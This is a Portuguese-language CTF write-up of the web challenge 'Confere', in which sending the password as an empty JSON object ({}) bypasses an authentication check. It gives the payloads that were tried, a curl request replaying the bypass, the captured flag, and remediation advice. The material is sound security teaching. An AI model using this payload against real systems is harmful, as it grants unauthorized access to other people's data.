---
title: 'Confere — Writeup completo'
description: 'O formulário HTML só manda string, mas a API JSON aceita qualquer tipo — e mandar a senha como um dict vazio quebra a checagem inteira.'
event: 'Infinity CTF 2026 (Harpia Security + SENAC)'
category: 'web'
difficulty: 'medium'
tags:
  - type-confusion
  - api
pubDate: 2026-08-22
author: 'Niedson'
draft: false
---

> [!NOTE/Sobre o desafio]
> **Plataforma:** Infinity CTF 2026 (Harpia Security + SENAC)
> **Categoria:** Web · **Dificuldade:** Medium · **Pontos:** 234
> **Vulnerabilidades:** Type confusion — campo de senha aceita tipo não-string e quebra a checagem
> **Flag:** `flag{infinity_ctf_2026_crivo_ca044801c3}`

> Internamente na plataforma esse desafio usa o slug `crivo` (é o que aparece na flag) — o nome de
> exibição é "Confere".

Esse desafio é um lembrete de que **o formulário HTML não é a API**. A interface que você vê no
navegador é só um dos jeitos possíveis de falar com o backend — e às vezes ela é bem mais restrita
do que a API que está por trás dela.

---

## 1. Contexto

O app tinha uma tela de consulta que pedia um código de cliente e uma senha de consulta associada.
Preenchendo o formulário normalmente:

```
POST /api/consulta
Content-Type: application/x-www-form-urlencoded

codigo_cliente=1234&senha_consulta=abc123
```

Senha errada devolvia "consulta negada". O formulário HTML, sendo um `<input type="text">` comum,
só é capaz de mandar texto — não tem como, pela UI, mandar um número, uma lista ou um objeto no
lugar da senha.

## 2. Reconhecimento

Mas o endpoint real por trás do formulário aceita JSON também (comum em apps modernos que servem o
mesmo backend pra formulário E pra chamadas via JavaScript):

```
POST /api/consulta
Content-Type: application/json

{"codigo_cliente": "1234", "senha_consulta": "abc123"}
```

E JSON, diferente de um formulário, permite mandar QUALQUER estrutura de dado no valor de um campo
— não só string.

## 3. Encontrando a vulnerabilidade

A pergunta que guiou o teste: será que o código no backend, ao comparar a senha enviada com a senha
esperada, assume cegamente que os dois lados da comparação são strings? Se sim, o que acontece
quando eu mando um tipo diferente?

Testei uma bateria de tipos não-string no campo `senha_consulta`:

```json
{"codigo_cliente": "1234", "senha_consulta": null}    → nega
{"codigo_cliente": "1234", "senha_consulta": false}   → nega
{"codigo_cliente": "1234", "senha_consulta": []}      → nega
{"codigo_cliente": "1234", "senha_consulta": 0}       → nega
{"codigo_cliente": "1234", "senha_consulta": {}}      → SUCESSO — consulta liberada!
```

Só o **dict vazio** (`{}`) quebrou a checagem — os outros tipos (null, false, lista vazia, zero)
foram tratados normalmente como "senha errada".

> [!IMPORTANT/A causa raiz provável]
> Um dict vazio é um valor **verdadeiro (truthy) em Python** (diferente de `None`, `False`, `[]` ou
> `0`, que são todos falsy) — então se o código faz algo como
> `if senha_consulta and senha_consulta == senha_esperada:` combinado com algum tratamento de
> exceção genérico ao redor da comparação (ex. um `try/except` que engole `TypeError` quando tenta
> comparar `dict == str`), o `{}` passa pela primeira parte do `if` (é truthy) e a comparação
> seguinte pode estar caindo num caminho de erro que, por engano, trata "não consegui comparar" como
> "não precisa validar" em vez de "nega por padrão". O sintoma bate exatamente com esse tipo de bug:
> uma comparação que quebra silenciosamente quando o tipo não é o esperado, em vez de falhar fechado.

## 4. Exploração

Com o tipo vazador identificado, o ataque é só repetir a requisição pra qualquer `codigo_cliente`
válido:

```bash
curl -X POST https://confere-<instancia>.../api/consulta \
  -H "Content-Type: application/json" \
  -d '{"codigo_cliente": "<qualquer-codigo-valido>", "senha_consulta": {}}'
```

## 5. Capturando a flag

A resposta veio com sucesso e os dados completos do cliente consultado, incluindo a flag:

```
flag{infinity_ctf_2026_crivo_ca044801c3}
```

## 6. Lições

- **Nunca teste só pelo formulário — teste a API crua.** O formulário HTML é uma restrição da
  interface, não do backend. Sempre vale montar a requisição JSON/raw diretamente e testar tipos
  que a UI nunca conseguiria mandar sozinha.
- **"Type confusion" em linguagens dinamicamente tipadas (Python, JS, PHP...) é uma classe de bug
  recorrente**: sempre que um campo pode, em teoria, receber qualquer tipo JSON (string, número,
  bool, null, lista, objeto), vale testar cada um — comparações, checagens de truthy/falsy e
  serializações se comportam de formas bem diferentes dependendo do tipo.
- **A correção certa**: validar o TIPO do campo explicitamente antes de qualquer lógica de negócio
  (ex. `isinstance(senha_consulta, str)`, rejeitando qualquer coisa que não seja string logo de
  cara) — nunca deixar a checagem de tipo ser "implícita" dentro de uma comparação ou de um
  `try/except` genérico.

---

_Writeup do desafio Confere (Infinity CTF 2026 · Web · Medium)._
